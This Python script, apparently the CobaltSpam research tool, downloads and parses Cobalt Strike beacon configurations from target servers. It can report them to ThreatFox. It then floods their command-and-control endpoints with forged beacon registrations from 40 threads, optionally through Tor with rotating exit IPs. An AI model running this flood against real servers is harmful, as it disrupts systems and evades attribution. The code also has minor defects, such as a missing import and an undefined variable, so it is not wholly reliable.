#!/usr/bin/python3
'''
By Gal Kristal from SentinelOne (gkristal.w@gmail.com) @gal_kristal
Refs: 
    https://github.com/RomanEmelyanov/CobaltStrikeForensic/blob/master/L8_get_beacon.py
    https://github.com/nccgroup/pybeacon
'''

import requests, struct, sys, os, urllib3
import argparse
from parse_beacon_config import cobaltstrikeConfig
from urllib.parse import urljoin
from io import BytesIO
from Crypto.Cipher import AES
import hmac
import urllib
import socket
from comm import *
import re
import rstr
import threading
import itertools
import time
from datetime import datetime
from threading import Timer
import sys
import urllib3
import json

HASH_ALGO = hashlib.sha256
SIG_SIZE = HASH_ALGO().digest_size
CS_FIXED_IV = b"abcdefghijklmnop"

EMPTY_UA_HEADERS = {"User-Agent":""}
URL_PATHS = {'x86':'ab2g', 'x64':'ab2h'}
max_threads = 40 # Number of threads for spamming
tor_session = None
tor_ip_renew_interval = max_threads * 3  # Renew IP after every X beacons sent
threatfox_api_key = "" # Please add your own API key for threatfox.abuse.ch here

class ColorPrint:

    @staticmethod
    def print_fail(message, end = '\n'):
        sys.stderr.write('\x1b[1;31m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_pass(message, end = '\n'):
        sys.stdout.write('\x1b[1;32m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_warn(message, end = '\n'):
        sys.stderr.write('\x1b[1;33m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_info(message, end = '\n'):
        sys.stdout.write('\x1b[1;34m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_bold(message, end = '\n'):
        sys.stdout.write('\x1b[1;37m' + message + '\x1b[0m' + end)


class FastWriteCounter(object):
    def __init__(self):
        self._number_of_read = 0
        self._counter = itertools.count()
        self._read_lock = threading.Lock()

    def increment(self):
        next(self._counter)

    def value(self):
        with self._read_lock:
            value = next(self._counter) - self._number_of_read
            self._number_of_read += 1
        return value


def query_ThreatFox(beacon_download_url, conf):
    if threatfox_api_key == "":
        ColorPrint.print_warn("No API key for ThreatFox defined in spam.py! Please add one to interact with ThreatFox!")
        return

    if conf['BeaconType'][0] == 'HTTP' or conf['BeaconType'][0] == 'HTTPS':
        pass
    else:
        print("BeaconType " + str(conf['BeaconType']) + " will not be submitted to ThreatFox.")
        return

    url = ""

    aes_source = os.urandom(16)
    m = Metadata(conf['PublicKey'], aes_source, str(conf['Spawnto_x64']))
    t = Transform(conf['HttpGet_Metadata'])

    body, headers, params = t.encode(m.pack().decode('latin-1'), '', str(m.bid))

    if ( 'HostHeader' in conf):
        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
        if domain :
            headers['Host'] = domain.group(1).strip()
            url = urljoin(conf['BeaconType'][0].lower() + '://' +  domain.group(1).strip() + ':' + str(conf['Port']), conf['C2Server'].split(',')[1])
        else:
            url = urljoin(conf['BeaconType'][0].lower() + '://' + conf['C2Server'].split(',')[0] + ':' + str(conf['Port']), conf['C2Server'].split(',')[1])

    comment = "[ Download URL of Beacon ]\n"
    comment += beacon_download_url + "\n"
    comment += "[ Extracted Beacon Config ]\n"

    for key in conf:
        comment += key + ": " + str(conf[key]) + "\n"

    try:
        r = requests.post('https://threatfox-api.abuse.ch/api/v1/', json = {'query':'search_ioc', 'search_term':url}).json()
        if r['query_status'] == "no_result":
            ColorPrint.print_pass("Good news! IOC '" + url + "' was not known to ThreatFox! Will post to ThreatFox ...")
            # IOC is not known and we can submit it
            headers = { "API-KEY": threatfox_api_key,}
            pool = urllib3.HTTPSConnectionPool('threatfox-api.abuse.ch', port=443, maxsize=50, headers=headers, cert_reqs='CERT_NONE', assert_hostname=True)
    
            data = {
                    'query':            'submit_ioc',
                    'threat_type':      'botnet_cc',
                    'ioc_type':         'url',
                    'malware':          'win.cobalt_strike',
                    'confidence_level': '100',
                    'reference':        '',
                    'comment':          comment,
                    'anonymous':        0,
                    'tags': [ 'CobaltStrike'],
                    'iocs': [ url ]
            }

            json_data = json.dumps(data)
            response = pool.request("POST", "/api/v1/", body=json_data)
            response = response.data.decode("utf-8", "ignore")
        else:
            ColorPrint.print_warn("IOC '" + url + "' was already known in ThreatFox and will not be posted!")
    except Exception as e:
        ColorPrint.print_fail("Error while contacting ThreatFox: " + str(e))

def exitfunc():
    # For benchmarking purposes
    print("Exit Time", datetime.now())
    os._exit(0)


def get_beacon_data(url, arch):
    full_url = urljoin(url, URL_PATHS[arch])
    try:
        if tor_session != None:
            resp = tor_session.get(full_url, timeout=10, headers=EMPTY_UA_HEADERS, verify=False)
        else:
            resp = requests.get(full_url, timeout=10, headers=EMPTY_UA_HEADERS, verify=False)
    except requests.exceptions.RequestException as e:
        ColorPrint.print_fail('[-] Connection error: ' + str(e))
        return

    if resp.status_code != 200:
        ColorPrint.print_fail('[-] Failed with HTTP status code: ' +  str(resp.status_code))
        return

    buf = resp.content

    # Check if it's a Trial beacon, therefore not xor encoded (not tested)
    eicar_offset = buf.find(b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE')
    if eicar_offset != -1:
        return cobaltstrikeConfig(BytesIO(buf)).parse_config()

    offset = buf.find(b'\xff\xff\xff')
    if offset == -1:
        ColorPrint.print_fail('[-] Unexpected buffer received')
        return
    offset += 3
    key = struct.unpack_from('<I', buf, offset)[0]
    size = struct.unpack_from('<I', buf, offset+4)[0] ^ key
    head_enc = struct.unpack_from('<I', buf, offset+8)[0] ^ key
    head = head_enc & 0xffff

    # Taken directly from L8_get_beacon.py
    if head == 0x5a4d or head ==0x9090:
        decoded_data = b''
        for i in range(2+offset//4, len(buf)//4-4):
            a = struct.unpack_from('<I', buf, i*4)[0]
            b = struct.unpack_from('<I', buf, i*4+4)[0]
            с = a ^ b
            decoded_data += struct.pack('<I', с)

        return cobaltstrikeConfig(BytesIO(decoded_data)).parse_config()


def register_beacon(conf, cnt):
    """Registers a random beacon and sends a task data.
    This is a POC that shows how a beacon send its metadata and task results with Malleable profiles
    
    Args:
        conf (dict): Beacon configuration dict, from cobaltstrikeConfig parser
    """
    # Register new random beacon
    if conf['BeaconType'][0] == 'HTTP' or conf['BeaconType'][0] == 'HTTPS':
        pass
    else:
        print("BeaconType " + str(conf['BeaconType']) + " not yet supported! Quitting.")
        return

    aes_source = os.urandom(16)
    m = Metadata(conf['PublicKey'], aes_source, str(conf['Spawnto_x64']))
    t = Transform(conf['HttpGet_Metadata'])

    body, headers, params = t.encode(m.pack().decode('latin-1'), '', str(m.bid))

    if ( 'HostHeader' in conf):
        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
        if domain :
            headers['Host'] = domain.group(1).strip()

    ColorPrint.print_info('[+] Registering new random beacon: comp=%s user=%s url=%s' % (m.comp, m.user, urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1])))

    try:
        if tor_session != None:
            req = tor_session.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
        else:
            req = requests.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
        ColorPrint.print_info('[Response code: ' + str(req.status_code) + ']')

        if domain:
            ColorPrint.print_pass('[' + str(cnt.value()) + '] Beacon registered at ' + urljoin(conf['BeaconType'][0]+'://'+ headers['Host'] +':'+str(conf['Port']), conf['C2Server'].split(',')[1]))
        else:
            ColorPrint.print_pass('[' + str(cnt.value()) + '] Beacon registered at ' + urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]))
    except Exception as e:
        ColorPrint.print_fail('[-] Got exception from server while trying ' + conf['C2Server'].split(',')[0] + ': %s' % e)
        if tor_session != None:
            spam_utils.renew_tor_ip()
        return

    # Increment the number of beacons even if it was not successful since the problem might be a faulty Tor exit node
    # and changing Tor IP won't be initiated if the number of beacons sent does not change
    cnt.increment()

    if tor_session != None:
        if cnt.value() % tor_ip_renew_interval == 0:
            ColorPrint.print_info("Renewing TOR IP")
            spam_utils.renew_tor_ip()
            ColorPrint.print_info("New IP: " + spam_utils.get_current_ip())


def spam(confs, cnt):
    while (1==1):
        for c in confs:
            register_beacon(c, cnt)


def print_header():
    ColorPrint.print_pass("  _____      _           _ _    _____")
    ColorPrint.print_pass(" / ____|    | |         | | |  / ____|") 
    ColorPrint.print_pass("| |     ___ | |__   __ _| | |_| (___  _ __   __ _ _ __ ___")
    ColorPrint.print_pass("| |    / _ \\| '_ \ / _` | | __|\___ \| '_ \\ / _` | '_ ` _ \\")
    ColorPrint.print_pass("| |___| (_) | |_) | (_| | | |_ ____) | |_) | (_| | | | | | |")
    ColorPrint.print_pass(" \_____\___/|_.__/ \__,_|_|\__|_____/| .__/ \__,_|_| |_| |_|")
    ColorPrint.print_pass("       [ Pew, pew, pew ]             | |")
    ColorPrint.print_pass("       [ @hariomenkel  ]             |_|") 
    print("\n")


def print_config(config):
    for key in config:
        ColorPrint.print_info(key + ": " + str(config[key]))

if __name__ == '__main__':
    print_header()
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--url", help="Target a single URL")
    group.add_argument("-f", "--file", help="Read targets from text file - One CS server per line")
    parser.add_argument("--print_config", help="Print the beacon config", default=False, type=lambda x: (str(x).lower() == 'true'))
    parser.add_argument("--use_tor", help="Should tor be used to connect to target?", default=False, type=lambda x: (str(x).lower() == 'true'))
    parser.add_argument("--publish_to_threatfox", help="Publish your findings to ThreatFox", default=False, type=lambda x: (str(x).lower() == 'true'))
    parser.add_argument("--parse_only", help="Only download beacon and parse it without spamming", default=False, type=lambda x: (str(x).lower() == 'true'))
    args = parser.parse_args()

    if args.use_tor:
        if spam_utils.test_tor():
            tor_session = spam_utils.get_tor_session()
        else:
            ColorPrint.print_fail("Tor is not working")
            exit(1)

    if args.url:
        confs = []
        ColorPrint.print_info("[*] Now testing " + args.url)
        x86_beacon_conf = get_beacon_data(args.url, 'x86')
        x64_beacon_conf = get_beacon_data(args.url, 'x64')
        if not x86_beacon_conf and not x64_beacon_conf:
            ColorPrint.print_fail("[-] Failed finding any beacon configuration")
            exit(1)

        ColorPrint.print_pass("[+] Got beacon configuration successfully")
        conf = x86_beacon_conf or x64_beacon_conf
        confs.append(conf)
        if args.print_config:
            ColorPrint.print_info("[*] Beacon config for " + args.url + ":")
            print_config(conf)

        if args.publish_to_threatfox:
            query_ThreatFox(args.url , conf)

        cnt = FastWriteCounter()
        threads = []
        if not args.parse_only:
            for i in range(max_threads):
                ColorPrint.print_info("Spawning new thread")
                t = threading.Thread(target=spam, args=(confs,cnt))
                threads.append(t)
                t.start()

    if args.file:
        confs = []
        try:
            f = open(args.file, 'r')
        except OSError:
            ColorPrint.print_fail("Could not open/read file:", fname)
            sys.exit()

        with f:
            reader = f.readlines()
            for line in reader:
                if line[0] != '#':
                    ColorPrint.print_info("[*] Now testing " + line.replace("\n",''))
                    x86_beacon_conf = get_beacon_data(line, 'x86')
                    x64_beacon_conf = get_beacon_data(line, 'x64')
                    if not x86_beacon_conf and not x64_beacon_conf:
                        ColorPrint.print_fail("[-] Failed finding any beacon configuration")
                    else:
                        ColorPrint.print_pass("[+] Got beacon configuration successfully")
                        conf = x86_beacon_conf or x64_beacon_conf
                        confs.append(conf)
                        if args.print_config:
                            ColorPrint.print_info("[*] Beacon config for " + line.replace("\n","") + ":")
                            print_config(conf)

                        if args.publish_to_threatfox:
                            query_ThreatFox(line.replace("\n",""), conf)

            if len(confs) > 0:
                cnt = FastWriteCounter()
                threads = []
                
                if not args.parse_only:
                    for i in range(max_threads):
                        ColorPrint.print_info("Spawning new thread")
                        t = threading.Thread(target=spam, args=(confs,cnt))
                        threads.append(t)
                        t.start()
            else:
                ColorPrint.print_fail("Couldn't find any valid targets - aborting ...")
